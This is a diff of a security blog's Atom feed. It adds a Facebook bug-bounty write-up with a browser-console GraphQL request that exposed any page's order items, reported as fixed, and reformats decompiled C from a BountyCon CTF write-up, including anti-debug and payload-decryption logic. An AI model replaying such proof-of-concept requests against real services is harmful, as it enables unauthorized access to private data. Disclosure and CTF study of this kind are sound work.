@@ -1,4 +1,22 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-03-14T13:37:07-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Waseem Ullah Siddiqui</title><subtitle>The goal of this blog is to share write-ups about bugs and CTF solutions.</subtitle><entry><title type="html">Facebook BountyCon 2020 Write-up</title><link href="http://localhost:4000/blog/2020/03/03/BountyCon-2020.html" rel="alternate" type="text/html" title="Facebook BountyCon 2020 Write-up" /><published>2020-03-03T21:44:46-08:00</published><updated>2020-03-03T21:44:46-08:00</updated><id>http://localhost:4000/blog/2020/03/03/BountyCon-2020</id><content type="html" xml:base="http://localhost:4000/blog/2020/03/03/BountyCon-2020.html">&lt;p&gt;This year Facebook/Google hosted BountyCon Capture the Flag competition. I participated in it and solved 15 of 17 challenges (except Proof of game and aglet). As I’m currently an undergraduate student and in the learning stage, my solutions will not be optimal. Although I didn’t get selected as a winner, still it was pretty fun and engaging to solve all of these challenges.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-08-06T22:06:35-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Waseem Ullah Siddiqui</title><subtitle>The goal of this blog is to share write-ups about bugs and CTF solutions.</subtitle><entry><title type="html">See recent order items of any Facebook page</title><link href="http://localhost:4000/blog/2020/08/05/See-recent-order-items-of-any-Facebook-page.html" rel="alternate" type="text/html" title="See recent order items of any Facebook page" /><published>2020-08-05T22:44:46-07:00</published><updated>2020-08-05T22:44:46-07:00</updated><id>http://localhost:4000/blog/2020/08/05/See-recent-order-items-of-any-Facebook-page</id><content type="html" xml:base="http://localhost:4000/blog/2020/08/05/See-recent-order-items-of-any-Facebook-page.html">&lt;p&gt;When Page admin adds the “Order Placed” label to the user message, Page admin can also include the details of the order such as item name, notes, image, etc. This bug allow any user to view these order items of any Facebook page. 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Proof of concept&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Send the following request in the browser console by replacing {Page_ID} with the ID of the target page.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;new AsyncRequest('/api/graphql/').setData({variables:'{&quot;pageID&quot;:&quot;{Page_ID}&quot;}',doc_id:2571623202931955}).send()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The response would contain the recent order items of the targeted page.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;	
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;30 March 2020 - Report Sent&lt;br /&gt;
+1 April 2020 - Acknowledged by Facebook&lt;br /&gt;
+2 April 2020 - Fixed by Facebook&lt;br /&gt;
+3 April 2020 - Confirmation of patch by me&lt;br /&gt;
+9 April 2020 - Bounty Awarded by Facebook&lt;/p&gt;</content><author><name></name></author><summary type="html">When Page admin adds the “Order Placed” label to the user message, Page admin can also include the details of the order such as item name, notes, image, etc. This bug allow any user to view these order items of any Facebook page.</summary></entry><entry><title type="html">Facebook BountyCon 2020 Write-up</title><link href="http://localhost:4000/blog/2020/03/03/BountyCon-2020.html" rel="alternate" type="text/html" title="Facebook BountyCon 2020 Write-up" /><published>2020-03-03T21:44:46-08:00</published><updated>2020-03-03T21:44:46-08:00</updated><id>http://localhost:4000/blog/2020/03/03/BountyCon-2020</id><content type="html" xml:base="http://localhost:4000/blog/2020/03/03/BountyCon-2020.html">&lt;p&gt;This year Facebook/Google hosted BountyCon Capture the Flag competition. I participated in it and solved 15 of 17 challenges (except Proof of game and aglet). As I’m currently an undergraduate student and in the learning stage, my solutions will not be optimal. Although I didn’t get selected as a winner, still it was pretty fun and engaging to solve all of these challenges.&lt;/p&gt;
 
 &lt;p&gt;Before coming to the right solution to the challenges. I tried a lot of different ways to solve the challenges. Below are the solutions that I used to solve the challenges.&lt;/p&gt;
 &lt;h1 id=&quot;secure-login&quot;&gt;Secure Login&lt;/h1&gt;
@@ -18,66 +36,66 @@ As server &lt;code class=&quot;highlighter-rouge&quot;&gt;ec2-3-11-37-224.eu-wes
 I started debugging it using Ghidra (a free and open-source reverse engineering tool developed by the National Security Agency). After opening the file with Ghidra and decompiling ASM to C code, there was a function &lt;code class=&quot;highlighter-rouge&quot;&gt;check_passwd&lt;/code&gt; which was responsible for the password validation.
 The function looked something like this:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void check_passwd(int param_1)
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;check_passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-{
-  int iVar1;
-  ssize_t sVar2;
-  long in_FS_OFFSET;
-  undefined8 local_b8;
-  undefined8 local_b0;
-  undefined8 local_a8;
-  undefined8 local_a0;
-  undefined8 local_98;
-  undefined8 local_90;
-  undefined8 local_88;
-  undefined8 local_80;
-  undefined8 local_78;
-  undefined8 local_70;
-  undefined8 local_68;
-  undefined8 local_60;
-  undefined8 local_58;
-  undefined8 local_50;
-  undefined8 local_48;
-  undefined8 local_40;
-  undefined8 local_38;
-  undefined8 local_30;
-  uchar local_28 [24];
-  undefined8 local_10;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sVar2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in_FS_OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_b8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_b0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_a8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_a0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_98&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_90&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_88&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_78&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;uchar&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_28&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   
-  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
-  local_b8 = 0;
-  local_b0 = 0;
-  local_a8 = 0;
-  local_a0 = 0;
-  local_98 = 0;
-  local_90 = 0;
-  local_88 = 0;
-  local_80 = 0;
-  local_78 = 0;
-  local_70 = 0;
-  local_68 = 0;
-  local_60 = 0;
-  local_58 = 0;
-  local_50 = 0;
-  local_48 = 0;
-  local_40 = 0;
-  local_38 = 0xa99dd1dbed586201;
-  local_30 = 0xc6bbb0b969f29e4d;
-  write(param_1,&quot;Password: &quot;,0xb);
-  do {
-    sVar2 = read(param_1,&amp;amp;local_b8,0x90);
-    if ((int)sVar2 &amp;lt; 1) {
-                    /* WARNING: Subroutine does not return */
-      exit(0);
-    }
-    MD5((uchar *)&amp;amp;local_b8,0x80,local_28);
-    iVar1 = memcmp(local_28,&amp;amp;local_38,0x10);
-  } while (iVar1 != 0);
-  write(param_1,&quot;BountyCon{XXXXXXXXXXXXXXXXXXXXXXXXXXX}\n&quot;,0x28);
-                    /* WARNING: Subroutine does not return */
-  exit(0);
-}
+  &lt;span class=&quot;n&quot;&gt;local_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in_FS_OFFSET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_b8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_b0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_a8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_a0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_98&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_90&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_88&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_80&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_78&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_70&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_68&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_60&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_58&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_48&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_40&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_38&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa99dd1dbed586201&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_30&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc6bbb0b969f29e4d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Password: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_b8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x90&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;cm&quot;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;MD5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uchar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_b8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;BountyCon{XXXXXXXXXXXXXXXXXXXXXXXXXXX}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                    &lt;span class=&quot;cm&quot;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;The line &lt;code class=&quot;highlighter-rouge&quot;&gt;sVar2 = read(param_1,&amp;amp;local_b8,0x90);&lt;/code&gt; is reading 144 characters from the user and saving it to local_b8.
@@ -262,52 +280,52 @@ anti_what.tar.gz
 &lt;p&gt;Running the file will print &lt;code class=&quot;highlighter-rouge&quot;&gt;Press any key to quit&lt;/code&gt;
 I used Ghidra to decompile the file. After opening the file with Ghidra and decompiling ASM to C code. Main Function looked something like this&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;undefined8 main(undefined8 param_1,char **param_2)
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-{
-  int iVar1;
-  long lVar2;
-  undefined4 extraout_var;
-  undefined8 uVar3;
-  long in_FS_OFFSET;
-  int local_15c;
-  termios local_158;
-  undefined local_118 [264];
-  long local_10;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iVar1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lVar2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extraout_var&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uVar3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in_FS_OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_15c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;termios&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_158&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;undefined&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_118&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;264&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   
-  local_10 = *(long *)(in_FS_OFFSET + 0x28);
-  local_15c = 0;
-  lVar2 = ptrace(PTRACE_TRACEME,0,1,0);
-  if (lVar2 == 0) {
-    local_15c = 2;
-  }
-  lVar2 = ptrace(PTRACE_TRACEME,0,1,0);
-  if (lVar2 == -1) {
-    local_15c = local_15c * 3;
-  }
-  if (local_15c == 6) {
-    RC4_set_key((RC4_KEY *)local_118,0x32,key);
-    RC4((RC4_KEY *)local_118,0x4e,ptext,ptext);
-    runPayload();
-    puts(&quot;Press any key to quit...&quot;);
-    tcgetattr(0,&amp;amp;local_158);
-    local_158.c_lflag = local_158.c_lflag &amp;amp; 0xfffffffd;
-    local_158.c_cc[6] = '\x01';
-    local_158.c_cc[5] = '\0';
-    tcsetattr(0,0,&amp;amp;local_158);
-    getchar();
-    uVar3 = 0;
-  }
-  else {
-    iVar1 = unlink(*param_2);
-    uVar3 = CONCAT44(extraout_var,iVar1);
-  }
-  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
-                    /* WARNING: Subroutine does not return */
-    __stack_chk_fail();
-  }
-  return uVar3;
-}
+  &lt;span class=&quot;n&quot;&gt;local_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in_FS_OFFSET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;local_15c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
